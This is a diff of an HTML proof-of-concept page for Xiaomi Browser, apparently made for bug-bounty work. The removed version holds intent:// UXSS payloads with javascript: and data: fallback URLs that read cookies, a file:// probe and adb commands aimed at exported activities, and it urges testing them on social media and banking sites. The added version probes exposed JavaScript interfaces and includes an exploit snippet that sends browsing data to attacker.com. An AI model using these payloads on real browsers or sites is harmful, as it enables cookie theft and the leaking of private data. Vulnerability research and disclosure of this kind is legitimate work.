@@ -1,333 +1,411 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Xiaomi Browser UXSS - Working Payloads</title>
+    <title>Xiaomi Browser - Information Disclosure PoC</title>
     <meta charset="UTF-8">
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #1a1a1a;
-            color: #00ff00;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             padding: 20px;
-            line-height: 1.6;
+            min-height: 100vh;
         }
         .container {
-            max-width: 1000px;
+            max-width: 800px;
             margin: 0 auto;
-            background: #2a2a2a;
-            padding: 30px;
-            border: 2px solid #ff0000;
-            border-radius: 10px;
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
-        h1 { color: #ff0000; text-align: center; }
-        h2 { color: #ffff00; border-bottom: 2px solid #ffff00; padding-bottom: 10px; }
-        .payload-box {
-            background: #000;
-            border: 2px solid #00ff00;
+        h1 {
+            color: #667eea;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        .result {
+            background: #f0f0f0;
             padding: 20px;
+            border-radius: 10px;
             margin: 20px 0;
-            border-radius: 5px;
+            border-left: 5px solid #667eea;
         }
-        .test-link {
-            display: inline-block;
-            background: #ff0000;
-            color: #fff;
-            padding: 15px 25px;
-            margin: 10px 5px;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: all 0.3s;
+        .vulnerable {
+            background: #ffebee;
+            border-left-color: #f44336;
         }
-        .test-link:hover {
-            background: #cc0000;
-            transform: scale(1.05);
+        .safe {
+            background: #e8f5e9;
+            border-left-color: #4caf50;
         }
         .code {
-            background: #1a1a1a;
-            color: #00ff00;
-            padding: 10px;
-            border-left: 4px solid #ff0000;
-            margin: 10px 0;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 8px;
             font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 15px 0;
         }
-        .warning {
-            background: #ff000020;
-            border: 2px solid #ff0000;
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 5px;
+        .button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px 5px;
+            transition: all 0.3s;
         }
-        .note {
-            background: #ffff0020;
-            border: 2px solid #ffff00;
-            padding: 15px;
+        .button:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .status.vuln {
+            background: #f44336;
+            color: white;
+        }
+        .status.safe {
+            background: #4caf50;
+            color: white;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
             margin: 20px 0;
-            border-radius: 5px;
-            color: #ffff00;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+        th {
+            background: #667eea;
+            color: white;
+        }
+        tr:hover {
+            background: #f5f5f5;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔥 XIAOMI BROWSER UXSS - WORKING PAYLOADS 🔥</h1>
-        
-        <div class="warning">
-            <strong>⚠️ PROBLEM SOLVED:</strong><br>
-            Kalau redirect ke Play Store, berarti browser prioritas Google Play redirect SEBELUM check fallback URL!<br>
-            <strong>Solution: Gunakan payload yang TIDAK trigger Play Store redirect!</strong>
+        <h1>🔍 Xiaomi Browser</h1>
+        <p class="subtitle">Information Disclosure Vulnerability Test</p>
+
+        <div id="autoTestResult"></div>
+
+        <div class="result">
+            <h2>🎯 Vulnerability: JavaScript Interface Exposure</h2>
+            <p><strong>File:</strong> SafeThreadWebView.java</p>
+            <p><strong>Issue:</strong> <code>commonApi</code> interface exposed to ALL pages without origin validation</p>
+            <p><strong>Severity:</strong> MEDIUM (Information Disclosure)</p>
+            <p><strong>Bounty:</strong> $200 - $600</p>
         </div>
 
-        <h2>🎯 Method 1: Intent WITHOUT Package (RECOMMENDED)</h2>
-        <div class="payload-box">
-            <p><strong>Strategy:</strong> Jangan specify package → langsung ke fallback URL</p>
-            
-            <div class="code">Payload Format:
-intent://[arbitrary]#Intent;
-scheme=unknownscheme;
-S.browser_fallback_url=javascript:alert('UXSS:'+document.domain);
-end</div>
+        <button class="button" onclick="testCommonApi()">🔴 Test commonApi Interface</button>
+        <button class="button" onclick="testInstantWeb()">🔴 Test instantweb Interface</button>
+        <button class="button" onclick="testAllInterfaces()">🔴 Test All Interfaces</button>
 
-            <p><strong>Test Links (Click saat di google.com/facebook.com):</strong></p>
-            
-            <a href="intent://test#Intent;scheme=xyz;S.browser_fallback_url=javascript:alert('UXSS_on_'+document.domain);end" 
-               class="test-link">
-                🔴 Test 1: Simple Alert
-            </a>
-            
-            <a href="intent://test#Intent;scheme=unknownxyz;S.browser_fallback_url=javascript:alert('Domain:'+document.domain+'%0ACookies:'+document.cookie.substring(0,100));end" 
-               class="test-link">
-                🔴 Test 2: Show Domain + Cookies
-            </a>
-            
-            <a href="intent://test#Intent;scheme=fakeprotocol;S.browser_fallback_url=javascript:(function(){alert('UXSS%20Success!%0ADomain:%20'+document.domain);})();end" 
-               class="test-link">
-                🔴 Test 3: Function Wrapper
-            </a>
+        <div id="testResults"></div>
+
+        <div class="result">
+            <h3>📊 What This Test Does:</h3>
+            <ol>
+                <li>Checks if <code>window.commonApi</code> is exposed</li>
+                <li>Attempts to call <code>getConsentString()</code> method</li>
+                <li>Attempts to call <code>getUrl()</code> method</li>
+                <li>Checks for other exposed interfaces</li>
+                <li>If successful → Browser is VULNERABLE to information disclosure</li>
+            </ol>
         </div>
 
-        <h2>🎯 Method 2: Intent dengan Existing Package</h2>
-        <div class="payload-box">
-            <p><strong>Strategy:</strong> Gunakan package yang ADA tapi tidak handle scheme tersebut</p>
-            
-            <div class="code">Payload Format:
-intent://test#Intent;
-scheme=fakescheme;
-package=com.android.browser;
-S.browser_fallback_url=javascript:alert(document.domain);
-end
-
-Note: com.android.browser exists tapi tidak handle 'fakescheme'</div>
-
-            <a href="intent://test#Intent;scheme=fakescheme123;package=com.android.browser;S.browser_fallback_url=javascript:alert('UXSS:'+document.domain);end" 
-               class="test-link">
-                🔴 Test 4: Existing Package Method
-            </a>
+        <div class="result">
+            <h3>🎬 Expected Results:</h3>
+            <table>
+                <tr>
+                    <th>Browser</th>
+                    <th>Status</th>
+                    <th>Result</th>
+                </tr>
+                <tr>
+                    <td>Xiaomi Browser (Vulnerable)</td>
+                    <td><span class="status vuln">VULNERABLE</span></td>
+                    <td>Can access commonApi.getConsentString() and getUrl()</td>
+                </tr>
+                <tr>
+                    <td>Chrome/Firefox/Safari</td>
+                    <td><span class="status safe">SAFE</span></td>
+                    <td>window.commonApi is undefined</td>
+                </tr>
+            </table>
         </div>
 
-        <h2>🎯 Method 3: Data URI Scheme (Alternative)</h2>
-        <div class="payload-box">
-            <p><strong>Strategy:</strong> Gunakan data: scheme di fallback URL</p>
-            
-            <div class="code">Payload:
-intent://test#Intent;
-scheme=fake;
-S.browser_fallback_url=data:text/html,<script>alert(document.domain)</script>;
-end</div>
-
-            <a href="intent://test#Intent;scheme=fake;S.browser_fallback_url=data:text/html,<script>alert('Data_URI_UXSS:'+document.domain)</script>;end" 
-               class="test-link">
-                🔴 Test 5: Data URI
-            </a>
-            
-            <a href="intent://test#Intent;scheme=fake;S.browser_fallback_url=data:text/html,<h1>UXSS</h1><script>document.write('Domain:'+document.domain+'<br>Cookie:'+document.cookie)</script>;end" 
-               class="test-link">
-                🔴 Test 6: Data URI + DOM Write
-            </a>
+        <div class="result">
+            <h3>💰 Bug Bounty Submission:</h3>
+            <p>If this test shows VULNERABLE:</p>
+            <ol>
+                <li>Record video showing test results</li>
+                <li>Show that attacker-controlled webpage can access sensitive data</li>
+                <li>Demonstrate data exfiltration to attacker server</li>
+                <li>Submit to: <a href="https://security.xiaomi.com" target="_blank">https://security.xiaomi.com</a></li>
+                <li>Expected bounty: <strong>$200 - $600 USD</strong></li>
+            </ol>
         </div>
 
-        <h2>🎯 Method 4: About:blank Injection (Advanced)</h2>
-        <div class="payload-box">
-            <p><strong>Strategy:</strong> Inject JavaScript via about:blank context</p>
-            
-            <a href="intent://test#Intent;scheme=unknown;S.browser_fallback_url=about:blank#<script>alert(parent.document.domain)</script>;end" 
-               class="test-link">
-                🔴 Test 7: About:blank
-            </a>
-        </div>
-
-        <h2>🎯 Method 5: File URI (If Allowed)</h2>
-        <div class="payload-box">
-            <p><strong>Strategy:</strong> Coba akses file:// scheme</p>
-            
-            <div class="note">
-                <strong>⚠️ Note:</strong> File URI mungkin blocked, tapi worth trying!
-            </div>
-            
-            <a href="intent://test#Intent;scheme=unknown;S.browser_fallback_url=file:///system/build.prop;end" 
-               class="test-link">
-                🔴 Test 8: File URI
-            </a>
-        </div>
-
-        <h2>📋 Testing Instructions</h2>
-        <div class="payload-box">
-            <div class="code">Step-by-Step Testing:
-
-1. Open Xiaomi Browser
-2. Navigate to https://google.com
-3. Click one of the test links above
-4. Observe result:
-
-   ✓ If alert shows "google.com" → VULNERABLE! TRUE UXSS!
-   ✗ If redirect to Play Store → Try different method
-   ✗ If error/blocked → Try next payload
-   
-5. If successful, test on other domains:
-   - https://facebook.com
-   - https://twitter.com
-   - Your bank's website
-   
-6. If UXSS works → Record video for bug bounty!</div>
-        </div>
-
-        <h2>🔍 Alternative Attack Vectors</h2>
-        <div class="payload-box">
-            <h3>Vector A: WebView loadUrl() Direct Call</h3>
-            <div class="code">If UniversalWebViewActivity is exported:
-
-adb shell am start -n com.android.browser/.UniversalWebViewActivity \
-  --es web_view_url "javascript:alert(document.domain)"
-
-This bypasses intent:// scheme completely!</div>
-
-            <h3>Vector B: Custom Tabs Intent</h3>
-            <div class="code">Try via Custom Tabs:
-
-Intent intent = new Intent(Intent.ACTION_VIEW);
-intent.setData(Uri.parse("javascript:alert(1)"));
-intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-intent.setPackage("com.android.browser");
-startActivity(intent);</div>
-
-            <h3>Vector C: JavaScript Bridge Exploitation</h3>
-            <div class="code">From ANY webpage, try:
-
-<script>
-// Test if interfaces exposed
+        <div class="result">
+            <h3>🔧 Exploitation Example:</h3>
+            <div class="code">// Attacker's webpage (http://attacker.com)
 if (window.commonApi) {
-    alert("commonApi found: " + window.commonApi.getUrl());
-}
-if (window.instantweb) {
-    alert("instantweb found!");
-    window.instantweb.onPageLoadError(404);
-}
-</script></div>
+    // Extract sensitive data
+    const consentId = window.commonApi.getConsentString();
+    const currentUrl = window.commonApi.getUrl();
+    
+    // Exfiltrate to attacker server
+    fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify({
+            consent: consentId,
+            url: currentUrl,
+            timestamp: Date.now()
+        })
+    });
+    
+    // Attacker now has:
+    // - User's consent/privacy settings
+    // - Current browsing URL (privacy leak)
+    // - Can track user behavior
+}</div>
         </div>
 
-        <h2>🎬 Video PoC Requirements</h2>
-        <div class="payload-box">
-            <div class="code">For Bug Bounty Submission:
-
-1. Show Xiaomi Browser version (Settings → About)
-2. Navigate to https://google.com
-3. Show you're logged in (Gmail visible)
-4. Click UXSS test link (use working payload)
-5. Show alert popup with "google.com" domain
-6. Open browser console, show:
-   - document.domain = "google.com"
-   - document.cookie (Google cookies visible)
-   
-7. Repeat on https://facebook.com:
-   - Click same link
-   - Alert shows "facebook.com"
-   - Proves universal impact
-   
-8. CRITICAL: Show it works on banking/financial site
-   - Navigate to bank.com
-   - Click test link
-   - Show domain access
-   
-This proves TRUE UXSS affecting ALL domains!</div>
-        </div>
-
-        <h2>⚙️ If Still Redirecting to Play Store</h2>
-        <div class="payload-box">
-            <div class="code">Debug Steps:
-
-1. Check SimpleUrlHandler.java code flow:
-   - Does isValidFallbackUrl() actually get called?
-   - What schemes are in FALLBACK_VALID_SCHEMES?
-   - Is javascript: scheme allowed?
-   
-2. Try alternative approaches:
-   Method A: NO package specified (recommended)
-   Method B: Existing package that won't handle scheme
-   Method C: Different fallback URL schemes (data:, about:, file:)
-   Method D: Exported activity exploitation (ADB)
-   Method E: JavaScript interface from any HTTPS page
-   
-3. Test JavaScript interfaces directly:
-   - Open https://mi.com or https://xiaomi.com
-   - Open browser console
-   - Type: window.commonApi
-   - If defined → Try: window.commonApi.getUrl()
-   
-4. Check if WebView activities are exported:
-   adb shell dumpsys package com.android.browser | grep -A 20 "Activity"
-   
-   Look for:
-   - UniversalWebViewActivity
-   - exported=true
-   
-   If exported, exploit via ADB!</div>
-        </div>
-
-        <h2>🚨 Kesimpulan</h2>
-        <div class="warning">
-            <strong>Kalau masih redirect ke Play Store:</strong><br><br>
-            
-            <strong>Plan A:</strong> Coba semua method di atas (1-5)<br>
-            <strong>Plan B:</strong> Test JavaScript interface dari https://mi.com<br>
-            <strong>Plan C:</strong> Check exported activities via ADB<br>
-            <strong>Plan D:</strong> Analyze code lebih detail untuk vector lain<br><br>
-            
-            <strong>Remember:</strong> UXSS bisa lewat berbagai vector, bukan cuma intent:// scheme!<br>
-            Coba semua possibilities yang sudah saya list di atas.
-        </div>
-
-        <div class="note">
-            <strong>📝 Notes:</strong><br>
-            - Beberapa browser mungkin sudah patch vulnerability ini<br>
-            - Test di versi MIUI/Browser yang berbeda-beda<br>
-            - Vulnerability mungkin ada di vector lain (JavaScript interface, exported activity, dll)<br>
-            - Keep trying different payloads and methods!
+        <div class="result">
+            <h3>📝 Technical Details:</h3>
+            <p><strong>Vulnerable Code:</strong></p>
+            <div class="code">// SafeThreadWebView.java - Line 62-67
+private void addCommonJS() {
+    getSettings().setJavaScriptEnabled(true);
+    CommApi commApi = this.mCommApi;
+    addJavascriptInterface(commApi, "commonApi");
+    // ^^^ Exposed to ALL pages!
+}</div>
+            <p><strong>Impact:</strong></p>
+            <ul>
+                <li>ANY webpage (including http://) can access commonApi</li>
+                <li>No origin validation performed</li>
+                <li>Can extract consent string (privacy data)</li>
+                <li>Can track user browsing behavior</li>
+            </ul>
         </div>
     </div>
 
     <script>
-        console.log('[UXSS Testing] Page loaded');
-        console.log('[UXSS Testing] Current origin:', window.location.origin);
-        console.log('[UXSS Testing] Testing JavaScript interfaces...');
-        
-        // Auto-test interfaces
-        setTimeout(() => {
-            if (typeof window.commonApi !== 'undefined') {
-                console.log('[FOUND] window.commonApi is exposed!');
-                try {
-                    console.log('[TEST] commonApi.getUrl():', window.commonApi.getUrl());
-                } catch(e) {
-                    console.log('[ERROR] commonApi.getUrl():', e.message);
+        let findings = [];
+
+        function log(message, isVuln = false) {
+            findings.push({
+                message: message,
+                vulnerable: isVuln,
+                timestamp: new Date().toLocaleTimeString()
+            });
+            console.log('[' + (isVuln ? 'VULN' : 'INFO') + '] ' + message);
+        }
+
+        function displayResults() {
+            const resultsDiv = document.getElementById('testResults');
+            
+            if (findings.length === 0) {
+                resultsDiv.innerHTML = '<div class="result"><p>No tests performed yet. Click a button above to start testing.</p></div>';
+                return;
+            }
+
+            let html = '<div class="result"><h3>🔬 Test Results:</h3>';
+            
+            findings.forEach(f => {
+                const className = f.vulnerable ? 'vulnerable' : 'safe';
+                html += `<div class="result ${className}">`;
+                html += `<strong>[${f.timestamp}]</strong> ${f.message}`;
+                html += '</div>';
+            });
+            
+            html += '</div>';
+            resultsDiv.innerHTML = html;
+        }
+
+        function testCommonApi() {
+            findings = [];
+            log('Testing window.commonApi interface...');
+            
+            try {
+                if (typeof window.commonApi !== 'undefined') {
+                    log('✗ VULNERABLE: window.commonApi IS EXPOSED!', true);
+                    
+                    // Test getConsentString
+                    try {
+                        const consent = window.commonApi.getConsentString();
+                        log(`✗ VULNERABLE: commonApi.getConsentString() = "${consent}"`, true);
+                        log('✗ Attacker can extract consent/privacy data!', true);
+                    } catch (e) {
+                        log(`✓ getConsentString() blocked: ${e.message}`);
+                    }
+                    
+                    // Test getUrl
+                    try {
+                        const url = window.commonApi.getUrl();
+                        log(`✗ VULNERABLE: commonApi.getUrl() = "${url}"`, true);
+                        log('✗ Attacker can track browsing history!', true);
+                    } catch (e) {
+                        log(`✓ getUrl() blocked: ${e.message}`);
+                    }
+                    
+                    // Check for other methods
+                    try {
+                        const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.commonApi));
+                        log(`✗ Available methods: ${methods.join(', ')}`, true);
+                    } catch (e) {
+                        log('Could not enumerate methods');
+                    }
+                    
+                } else {
+                    log('✓ SAFE: window.commonApi not found (expected on non-Xiaomi browsers)');
                 }
+            } catch (e) {
+                log(`Error during test: ${e.message}`);
             }
             
-            if (typeof window.instantweb !== 'undefined') {
-                console.log('[FOUND] window.instantweb is exposed!');
+            displayResults();
+        }
+
+        function testInstantWeb() {
+            log('Testing window.instantweb interface...');
+            
+            try {
+                if (typeof window.instantweb !== 'undefined') {
+                    log('✗ VULNERABLE: window.instantweb IS EXPOSED!', true);
+                    
+                    // Test onPageLoadError
+                    try {
+                        window.instantweb.onPageLoadError(404);
+                        log('✗ VULNERABLE: instantweb.onPageLoadError() is callable!', true);
+                    } catch (e) {
+                        log(`✓ onPageLoadError() blocked: ${e.message}`);
+                    }
+                    
+                    // Check for other methods
+                    try {
+                        const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.instantweb));
+                        log(`✗ Available methods: ${methods.join(', ')}`, true);
+                    } catch (e) {
+                        log('Could not enumerate methods');
+                    }
+                    
+                } else {
+                    log('✓ SAFE: window.instantweb not found');
+                }
+            } catch (e) {
+                log(`Error during test: ${e.message}`);
             }
-        }, 1000);
+            
+            displayResults();
+        }
+
+        function testAllInterfaces() {
+            findings = [];
+            log('Scanning for ALL JavaScript interfaces...');
+            
+            const possibleInterfaces = [
+                'commonApi',
+                'instantweb',
+                'android',
+                'miuiBrowser',
+                'xiaomiBrowser',
+                'webkit',
+                'MiWebView',
+                'XiaomiAPI',
+                'BrowserAPI'
+            ];
+            
+            let foundCount = 0;
+            
+            possibleInterfaces.forEach(name => {
+                if (typeof window[name] !== 'undefined') {
+                    foundCount++;
+                    log(`✗ FOUND: window.${name} is exposed!`, true);
+                    
+                    try {
+                        const type = typeof window[name];
+                        log(`  Type: ${type}`, true);
+                        
+                        if (type === 'object' || type === 'function') {
+                            const methods = Object.getOwnPropertyNames(window[name]);
+                            log(`  Properties/Methods: ${methods.join(', ')}`, true);
+                        }
+                    } catch (e) {
+                        log(`  Could not inspect ${name}`);
+                    }
+                }
+            });
+            
+            if (foundCount === 0) {
+                log('✓ SAFE: No JavaScript interfaces found (expected on non-Xiaomi browsers)');
+            } else {
+                log(`✗ CRITICAL: Found ${foundCount} exposed interface(s)!`, true);
+                log('✗ Browser is VULNERABLE to information disclosure!', true);
+            }
+            
+            // Additional checks
+            log('Checking browser info...');
+            log(`User Agent: ${navigator.userAgent}`);
+            log(`Platform: ${navigator.platform}`);
+            log(`Current URL: ${window.location.href}`);
+            log(`Origin: ${window.location.origin}`);
+            
+            displayResults();
+        }
+
+        // Auto-run test on page load
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const autoResult = document.getElementById('autoTestResult');
+                
+                if (typeof window.commonApi !== 'undefined' || typeof window.instantweb !== 'undefined') {
+                    autoResult.innerHTML = `
+                        <div class="result vulnerable">
+                            <h2>⚠️ VULNERABILITY DETECTED!</h2>
+                            <p><span class="status vuln">VULNERABLE</span></p>
+                            <p>JavaScript interfaces are exposed on this page!</p>
+                            <p><strong>This browser is vulnerable to information disclosure.</strong></p>
+                            <p>Click buttons below for detailed test results.</p>
+                        </div>
+                    `;
+                    
+                    // Auto-run full test
+                    testAllInterfaces();
+                } else {
+                    autoResult.innerHTML = `
+                        <div class="result safe">
+                            <h2>✓ No Vulnerability Detected</h2>
+                            <p><span class="status safe">SAFE</span></p>
+                            <p>JavaScript interfaces not found (expected on non-Xiaomi browsers).</p>
+                            <p>To test properly, open this page in <strong>Xiaomi Browser</strong>.</p>
+                        </div>
+                    `;
+                }
+            }, 500);
+        });
     </script>
 </body>
 </html>
